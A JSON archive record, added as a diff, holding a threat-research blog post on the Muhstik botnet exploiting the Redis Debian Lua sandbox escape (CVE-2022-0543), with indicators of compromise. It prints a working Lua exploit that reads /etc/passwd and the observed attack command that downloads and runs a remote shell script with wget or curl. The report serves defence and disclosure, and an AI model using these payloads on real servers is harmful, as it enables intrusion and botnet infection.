@@ -1,0 +1,42 @@
+{
+    "id": "e97d42f6-a921-4687-adbd-60fd1f2e2ee4",
+    "created_at": "2023-01-12T15:05:24.171965Z",
+    "updated_at": "2025-03-27T02:06:08.709178Z",
+    "deleted_at": null,
+    "sha1_hash": "edbc12ace6a29128eb8d291e29142cfa4e0bfe26",
+    "title": "2022-03-24 - Muhstik Gang targets Redis Servers",
+    "authors": "",
+    "file_creation_date": "2022-05-28T03:55:17Z",
+    "file_modification_date": "2022-05-28T03:55:17Z",
+    "file_size": 495052,
+    "plain_text": "# Muhstik Gang targets Redis Servers\n\n**[blogs.juniper.net/en-us/security/muhstik-gang-targets-redis-servers](https://blogs.juniper.net/en-us/security/muhstik-gang-targets-redis-servers)**\n\nMarch 25, 2022\n\nJuniper Threat Labs has uncovered an attack that targets Redis Servers using a recently\ndisclosed vulnerability, namely CVE-2022-0543. This vulnerability exists in some Redis\nDebian packages. The attack started on March 11, 2022 from the same threat actor we’ve\n[seen targeting confluence servers back in September 2021 and the same group targeting](https://blogs.juniper.net/en-us/threat-research/muhstik-botnet-targeting-confluence-servers-with-cve-2021-26084)\nLog4j back in December. The payload used is a variant of Muhstik bot that can be used to\nlaunch DDOS attacks\n\n## CVE-2022-0543: Redis Lua Sandbox Escape and Remote Code Execution\n\n[“Redis is a very widely used service for caching, but it’s also used as a message](https://redis.io/)\nbroker. Clients talk to a Redis server over a socket, send commands, and the server\nchanges its state (i.e. its in-memory structures), in response to such commands. Redis\nembeds the Lua programming language as its scripting engine, which is made\n[available through the eval command. The Lua engine is expected to be sandboxed,](http://antirez.com/news/119)\ni.e., clients can interact with the Redis APIs from Lua, but should not be able to\nexecute arbitrary code on the machine where Redis is running.“\n\n– Reginaldo Silva\n\n\n-----\n\nIn January 2022, Reginaldo Silva [discovered a vulnerability in Redis (Debian-specific) that](https://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce)\nallows Lua sandbox escape. A remote attacker with the ability to execute arbitrary Lua\nscripts could escape the Lua sandbox and execute arbitrary code on the host.\n\nThis vulnerability existed because the Lua library in some Debian/Ubuntu packages is\nprovided as a dynamic library (Ubuntu Bionic and Trusty are not affected). When the Lua\ninterpreter initializes, the “package” variable is automatically populated, and that in turn\npermitted access to arbitrary Lua functionality.\n\nFor instance, we can use “package.loadlib” to load the modules from “liblua” library, then\nuse this module to execute commands.\n\n[The following is a proof of concept on how to exploit this vulnerability.](https://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543)\n```\nlocal io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\",\n\"luaopen_io\");\nlocal io = io_l();\nlocal f = io.popen(\"cat /etc/passwd\", \"r\");\nlocal res = f:read(\"*a\");\nf:close();\nreturn res\n\n```\nTo demonstrate this attack, we instantiated a vulnerable Redis server and launched the\nabove Lua scripts using the “eval” command. As you can observe from the screenshot\nbelow, we are able to achieve code execution by dumping the contents of /etc/passwd.\n\nProof of concept of executing system commands inside the Redis session\n\n## Payload: Muhstik bot\n\n\n-----\n\ntimeline of attacks on CVE-2022-0543\nOn March 11, Juniper Threat Labs observed attacks launching this exploit from our telemetry.\nThe attack attempts to download “russia.sh” using wget or curl from “106[.]246.224.219”. It\nsaves it as “/tmp/russ” and executes it.\n```\neval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\",\n\"luaopen_io\"); \nlocal io = io_l(); \nlocal f = io.popen(\"(wget -O /tmp/russ http://106[.]246.224.219/russia.sh || curl -o\n/tmp/russ http://106[.].246.224.219/russia.sh); \nchmod 700 /tmp/russ; /tmp/russ\", \"r\"); \nlocal res = f:read(\"*a\"); f:close(); return res' 0\n\n```\n\n-----\n\ncontents of russia.sh\nThis script (russia.sh) will further download and execute linux binaries from 160[.]16.58.163.\nThese binaries are identified to be variants of Muhstik bot. This bot connects to an IRC\nserver to receive commands which include the following:\n\nDownload files\nShell commands\nFlood attacks\nSSH brute force\n\n\n-----\n\nStrings inside Muhstik bot indicating its capabilities\n\n## Threat Actor\n\nWe mapped the originating IP of these attacks to figure out if these are related to some\ngroups we are tracking. We found that the following IPs was used in the past to launch\nattacks:\n\n170[.]210.45.163\n191[.]232.38.25\n79[.]172.212.132\n\nFor instance, the IP 191.232.38.25 was used in September 2021 to launch attacks on\n[Confluence Servers exploiting CVE-2021-26084. We have documented that attack here. It’s](https://blogs.juniper.net/en-us/threat-research/muhstik-botnet-targeting-confluence-servers-with-cve-2021-26084)\nworth noting that the group is still using the same Muhstik bot. The same IP was again used\nin December to launch attacks on Apache Log4j.\n\n\n-----\n\nTimeline of observed attacks launched from 191[.]232.38.25\n\n## Conclusion\n\nWe advise those who may be vulnerable to patch their Redis service. Debian and Ubuntu\nhave also released security advisories regarding this matter. Links are below:\n\n[Debian Advisory](https://security-tracker.debian.org/tracker/CVE-2022-0543)\n[Ubuntu Advisory](https://ubuntu.com/security/CVE-2022-0543)\n\n## Indicators of Compromise\n\n4817893f8e724cbc5186e17f46d316223b7683dcbc9643e364b5913f8d2a9197 pty1\n46389c117c5f41b60e10f965b3674b3b77189b504b0aeb5c2da67adf55a7129f pty10\n95d1fca8bea30d9629fdf05e6ba0fc6195eb0a86f99ea021b17cb8823db9d78b pty2\n7d3855bb09f2f6111d6c71e06e1e6b06dd47b1dade49af0235b220966c2f5be3 pty3\n16b4093813e2923e9ee70b888f0d50f972ac607253b00f25e4be44993d263bd2 pty4\n28443c0a9bfd8a12c12a2aad3cc97d2e8998a9d8825fcf3643d46012f18713f0 pty5\n36a2ac597030f3f3425153f5933adc3ca62259c35f687fde5587b8f5466d7d54 russia.sh\n\n**Download IP**\n\n106[.]246.224.219\n\n160[.]16.58.163\n\n**Attacker IP**\n\n104[.]236.150.159\n\n170[.]210.45.163\n\n146[.]185.136.187\n\n178[.]62.69.4\n\n\n-----\n\n191[.]232.38.25\n79[.]172.212.132\n221[.]120.103.253\n\n## Reference:\n\nhttps://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543\n\nhttps://www.ubercomp.com/posts/2022-01-20_redis_on_debian_rce\n\nhttps://github.com/vulhub/vulhub/tree/master/redis/CVE-2022-0543\n\n\n-----",
+    "language": "EN",
+    "sources": [
+        {
+            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
+            "created_at": "2023-01-12T14:38:44.599904Z",
+            "updated_at": "2023-01-12T14:38:44.599904Z",
+            "deleted_at": null,
+            "name": "VXUG",
+            "url": "https://www.vx-underground.org",
+            "description": "vx-underground Papers",
+            "reports": null
+        }
+    ],
+    "references": [
+        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-03-24 - Muhstik Gang targets Redis Servers.pdf"
+    ],
+    "report_names": [
+        "2022-03-24 - Muhstik Gang targets Redis Servers.pdf"
+    ],
+    "threat_actors": [],
+    "ts_created_at": 1673535924,
+    "ts_updated_at": 1743041168,
+    "ts_creation_date": 1653710117,
+    "ts_modification_date": 1653710117,
+    "files": {
+        "pdf": "https://archive.orkl.eu/edbc12ace6a29128eb8d291e29142cfa4e0bfe26.pdf",
+        "text": "https://archive.orkl.eu/edbc12ace6a29128eb8d291e29142cfa4e0bfe26.txt",
+        "img": "https://archive.orkl.eu/edbc12ace6a29128eb8d291e29142cfa4e0bfe26.jpg"
+    }
+}
